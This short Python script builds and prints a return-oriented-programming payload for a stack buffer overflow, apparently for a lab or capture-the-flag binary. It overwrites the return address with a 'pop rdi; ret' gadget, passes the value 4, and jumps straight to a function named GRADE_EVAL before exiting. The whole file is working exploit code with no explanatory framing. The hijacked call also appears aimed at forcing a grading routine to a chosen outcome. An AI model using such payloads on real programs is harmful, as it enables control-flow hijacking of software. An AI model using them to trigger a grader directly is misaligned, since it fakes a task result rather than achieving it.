import struct
import sys

def p64(x):
    return struct.pack("<Q", x)

POP_RDI = 0x401a33          # pop rdi ; ret   (0x401a32: 41 5f  c3)
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016e0

payload = b"A" * 24 + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(EXIT_PLT)
sys.stdout.buffer.write(payload)
